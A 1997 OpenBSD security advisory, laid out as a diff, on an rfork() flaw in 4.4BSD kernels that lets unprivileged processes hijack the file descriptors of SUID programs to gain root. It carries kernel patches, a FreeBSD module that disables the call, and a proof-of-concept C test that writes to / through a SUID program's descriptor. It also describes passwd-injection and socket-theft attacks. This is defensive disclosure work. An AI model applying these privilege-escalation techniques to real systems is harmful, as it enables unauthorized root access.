@@ -1,0 +1,364 @@
+
+
+----------------------------------------------------------------------------
+                
+                        OpenBSD Security Advisory
+        
+                              August 2, 1997
+
+                  Vulnerability in rfork() System Call
+
+----------------------------------------------------------------------------
+
+SYNOPSIS
+
+A vulnerability in certain 4.4BSD kernels allows processes to gain
+access to restricted resources by manipulating the file descriptor
+tables of SUID and SGID executables. Applications of this vulnerability
+will allow users to gain root access. 
+
+----------------------------------------------------------------------------
+
+AFFECTED SYSTEMS
+
+It is believed that all 4.4BSD operating systems implementing the 
+rfork() system call are currently vulnerable to this problem. These
+operating systems include OpenBSD 2.1 and FreeBSD 3.0. The OpenBSD
+project has resolved this problem in OpenBSD-current.
+
+The rfork() system call originated in the Plan9 operating system,
+and the 4.4BSD implementations of it share the original's semantics.
+Therefore, it is believed that Plan9 may be vulnerable as well.
+
+Code is provided at the end of this document that will allow system
+operators to test their vulnerability.
+
+----------------------------------------------------------------------------
+
+DETAILS
+
+Recent 4.4BSD operating systems added the rfork() system call as an
+additional method of creating a new process. Unlike fork(), rfork()
+allows the caller tighter control over which resources are shared
+between the parent and child processes. These resources include
+the per-process descriptor table.
+
+The descriptor table of a process lists all open file descriptors
+for that process. Input and output on files, sockets, and pipes is
+done through these descriptors. Two processes sharing the same 
+descriptor table can read from any file either has open in read mode,
+and write to any file either has in write mode.
+
+Unfortunately, the 4.4BSD implementation of rfork() allows this to occur
+with processes whose credentials have been altered via SUID/SGID programs.
+A process can execute any SUID program on the system and gain access to
+it's file descriptor table. This can be exploited to allow unprivileged
+processes to access security-critical resources, such as the password
+file.
+
+----------------------------------------------------------------------------
+
+TECHNICAL INFORMATION
+
+The default behavior of rfork() is to share the file descriptor table
+between the child and parent processes. A process created with rfork() can
+therefore, by default, be manipulated by it's parent. 
+
+An example of this problem occurs in passwd(1), an SUID program that
+modifies the password database. A user on the system can rfork() a process
+and use it to execute passwd(1). The child process will gain effective
+superuser credentials as a result of executing the SUID program. The
+parent can then wait for the temporary copy of the password database to be
+opened, and inject a fake entry into it using the file descriptor it
+now shares with passwd(1). When the password database is rebuilt, the fake
+entry will be commited to it and system security will be compromised.
+
+It should be noted that this is not the only avenue of exploitation for
+this problem. The vulnerability allows complete control over the file
+descriptor tables of privileged programs; this can be exploited in a
+variety of ways with any SUID program. 
+
+Another possible attack allows an attacker to, among other things, steal
+sockets from network programs; an attacker can execute an SUID networking
+program such as "ping", duplicate the descriptor associated with a raw
+socket, and close the original descriptor. The unprivileged attacker now
+controls a raw socket.
+
+Additionally, an attacker can close a descriptor opened by an SUID
+program, and re-open it pointing elsewhere, causing the SUID program to
+unwittingly alter any file accessible by the attacker.
+
+----------------------------------------------------------------------------
+
+RESOLUTION
+
+Provided at the end of this document is a patch from OpenBSD-current that
+resolves the problem in OpenBSD systems. The OpenBSD patch alters execve()
+to cause it not to honor the SUID or SGID bit when executing from a
+process that shares a file descriptor table with a different process.
+
+Also provided is a modloadable workaround for FreeBSD. The provided module
+will disable the rfork() system call from a running system that supports
+loadable modules. 
+
+----------------------------------------------------------------------------
+
+OPENBSD PATCH
+
+The following patch resolves the rfork() problem in OpenBSD systems.
+
+-- cut here --
+
+--- kern_exec.c 1997/06/05 08:05:54     1.11
++++ kern_exec.c 1997/08/01 22:54:50     1.12
+@@ -1,4 +1,4 @@
+-/*     $OpenBSD: rfork,v 1.1 1997/09/16 08:17:48 deraadt Exp $  */
++/*     $OpenBSD: rfork,v 1.1 1997/09/16 08:17:48 deraadt Exp $  */
+ /*     $NetBSD: kern_exec.c,v 1.75 1996/02/09 18:59:28 christos Exp $  */
+ 
+ /*-
+@@ -124,7 +124,8 @@
+                error = EACCES;
+                goto bad1;
+        }
+-       if ((vp->v_mount->mnt_flag & MNT_NOSUID) || (p->p_flag & P_TRACED))
++       if ((vp->v_mount->mnt_flag & MNT_NOSUID) ||
++           (p->p_flag & P_TRACED) || p->p_fd->fd_refcnt > 1)
+                epp->ep_vap->va_mode &= ~(VSUID | VSGID);
+ 
+        /* check access.  for root we have to see if any exec bit on */
+
+-- cut here --
+
+----------------------------------------------------------------------------
+
+FREEBSD PATCH
+
+The following patch is unsupported by the FreeBSD project.
+
+-- cut here --
+
+--- kern_exec.c Wed Apr 23 17:13:00 1997
++++ kern_exec_new.c     Sat Aug  2 19:18:34 1997
+@@ -653,7 +653,9 @@
+         * Disable setuid/setgid if the filesystem prohibits it or if
+         * the process is being traced.
+         */
+-        if ((vp->v_mount->mnt_flag & MNT_NOSUID) || (p->p_flag & P_TRACED))
++        if ((vp->v_mount->mnt_flag & MNT_NOSUID) 
++           || (p->p_flag & P_TRACED)
++           || p->p_fd->fd_refcnt > 1)
+                attr->va_mode &= ~(VSUID | VSGID);
+ 
+        return (0);
+
+-- cut here -- 
+
+----------------------------------------------------------------------------
+
+FREEBSD WORKAROUND
+
+The following module, when loaded on a FreeBSD system supporting
+rfork(), will disable the system call as a temporary resolution 
+to the problem.
+
+-- cut here --
+
+# This is a shell archive.  Save it in a file, remove anything before
+# this line, and then unpack it by entering "sh file".  Note, it may
+# create directories; files and directories will be owned by you and
+# have default permissions.
+#
+# This archive contains:
+#
+#       Makefile
+#       unrfork_mod_load.c
+#
+echo x - Makefile
+sed 's/^X//' >Makefile << 'END-of-Makefile'
+XBINDIR=        .
+XSRCS=  unrfork_mod_load.c 
+XKMOD=  disable_rfork
+XNOMAN= none
+X
+XCLEANFILES+= ${KMOD}
+X
+X.include <bsd.kmod.mk>
+END-of-Makefile
+echo x - unrfork_mod_load.c
+sed 's/^X//' >unrfork_mod_load.c << 'END-of-unrfork_mod_load.c'
+X#define RFORK_SYSCALL_NO 251
+X
+X#include <sys/param.h>
+X#include <sys/ioctl.h>
+X#include <sys/proc.h>
+X#include <sys/systm.h>
+X#include <sys/sysproto.h>
+X#include <sys/conf.h>
+X#include <sys/mount.h>
+X#include <sys/exec.h>
+X#include <sys/sysent.h>
+X#include <sys/lkm.h>
+X#include <a.out.h>
+X#include <sys/file.h>
+X#include <sys/errno.h>
+X#include <sys/queue.h>
+X#include <sys/mbuf.h>
+X#include <sys/socket.h>
+X#include <sys/socketvar.h>
+X#include <sys/protosw.h>
+X#include <sys/kernel.h>
+X#include <sys/sockio.h>
+X
+Xint disable_rfork(struct lkm_table *lkp, int cmd, int ver);
+X
+XMOD_MISC(disable_rfork);
+X
+Xstatic int 
+Xdisable_rfork_load(struct lkm_table *lkp, int cmd) {
+X       struct sysent *sp = &sysent[RFORK_SYSCALL_NO];
+X       int err = 0;
+X
+X       switch(cmd) {
+X               case LKM_E_LOAD:
+X                       sp->sy_call = (sy_call_t *) nosys;
+X 
+X                       printf("rfork() call disabled\n");
+X                       break;
+X               
+X               case LKM_E_UNLOAD:
+X                       sp->sy_call = (sy_call_t *) rfork;
+X
+X                       printf("rfork() call enabled\n");
+X                       break;
+X
+X               default:
+X                       err = EINVAL;
+X                       break;
+X       }
+X
+X       return(err);
+X}
+X
+Xint disable_rfork(struct lkm_table *lkp, int cmd, int ver) {
+X       DISPATCH(lkp, cmd, ver, disable_rfork_load, 
+X                               disable_rfork_load, lkm_nullcmd);
+X}
+END-of-unrfork_mod_load.c
+exit
+
+----------------------------------------------------------------------------
+
+EXAMPLE CODE
+
+The following code tests for the presence of the rfork() vulnerability on
+4.4BSD systems. If, after running this program, a file is created in "/"
+containing the word "VULNERABLE", the system is vulnerable to the problem.
+
+To use this test, extract the following two C programs. Compile the first
+("dummy-suid") and make it SUID root, world executable. Compile and run
+the second in the same directory.
+
+-- cut here (dummy-suid.c) --
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <errno.h>
+
+int main() {
+        int fd;
+
+        umask(2);
+
+        /* open a file in the root directory */
+
+        if(fd = open("/VULNERABLE", O_RDWR|O_CREAT) < 0) {
+                perror("open");
+                exit(0);
+        }
+
+        /* wait for something to happen */
+
+        for(;;);
+
+        exit(0);
+}
+
+-- cut here (test.c) --
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+        int p;
+
+        /* UNPRIVILEGED */
+
+        /* create a new process that shares it's parent's file 
+         * descriptor table 
+         */
+
+        if(!(p = rfork(RFPROC))) {
+
+                /* wait for parent to open a file, write
+                 * to it.
+                 */
+
+                sleep(1);
+                write(3, "VULNERABLE\n", 10);
+                exit(0);
+        }
+
+        /* PRIVILEGED */
+
+        /* execute 'p', an SUID program that opens a file and 
+         * hangs
+         */
+
+        execl("./dummy-suid", "dummy-suid", NULL);
+
+        exit(0);
+}
+
+-- cut here --
+
+----------------------------------------------------------------------------
+
+CREDITS
+
+The OpenBSD development team would like to express gratitude to Danny
+Dulai for his discovery of this problem, to Theo de Raadt for the OpenBSD
+patch, and to Tim Newsham, for providing proof-of-concept code.
+
+The developers at OpenBSD would also like to thank Perry Metzger for his
+reliable and consistant support of their work. 
+
+OpenBSD would like to thank Crosswalk Network Security, Inc. for 
+extensive assistance in the discovery, testing, and documentation of this
+vulnerability.
+
+---
+        Crosswalk Network Security, Inc. is a full service computer
+security consultancy, founded to address the growing need for
+comprehensive data protection solutions.  By providing extensive security
+auditing, intrusion detection and response, rigid policy design, and
+implementation of cutting-edge encryption systems, Crosswalk ensures
+robust, thorough, and uncompromising protection for organizations seeking
+enterprise wide data security.
+
+        For more information, mail info@crosswalk.com.
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.2
+ 
+mQCNAzPjeZkAAAEEAL4FxOmLn0b4xbgO4VOs0q/puHP2PQQe8u+H9HBKVzdcJpNi
+Rux9m9YcrVheJiI14LXsXyQjRc2gPUg2449KVJmlaftY99XsqWMv14SnXdVuwbLd
+M2PyVf9dQe0fhqhRTCchXG9rGtYUPowSofBpNHmkQ8Vy0UqGAmB3uXRU3efNAAUR
+tDlDcm9zc3dhbGsgTmV0d29yayBTZWN1cml0eSwgSW5jLiA8c2VjdXJpdHlAY3Jv
+c3N3YWxrLmNvbT4=
+=TIRq
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+
+
